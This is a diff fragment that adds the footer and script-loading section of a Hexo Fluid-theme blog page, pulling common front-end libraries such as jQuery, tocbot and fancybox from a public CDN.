+    <div class="footer-inner">
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
